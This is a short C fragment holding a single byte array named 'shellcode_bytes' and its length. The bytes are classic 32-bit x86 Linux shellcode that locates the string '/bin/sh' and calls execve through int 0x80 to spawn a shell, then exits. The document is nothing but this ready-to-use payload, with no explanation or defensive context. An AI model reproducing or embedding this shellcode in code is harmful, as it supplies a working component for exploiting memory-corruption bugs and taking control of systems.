unsigned char shellcode_bytes[] = {
  0xeb, 0x2a, 0x5e, 0x89, 0x76, 0x08, 0xc6, 0x46, 0x07, 0x00, 0xc7, 0x46,
  0x0c, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x0b, 0x00, 0x00, 0x00, 0x89, 0xf3,
  0x8d, 0x4e, 0x08, 0x8d, 0x56, 0x0c, 0xcd, 0x80, 0xb8, 0x01, 0x00, 0x00,
  0x00, 0xbb, 0x00, 0x00, 0x00, 0x00, 0xcd, 0x80, 0xe8, 0xd1, 0xff, 0xff,
  0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68
};
unsigned int shellcode_bytes_len = 56;
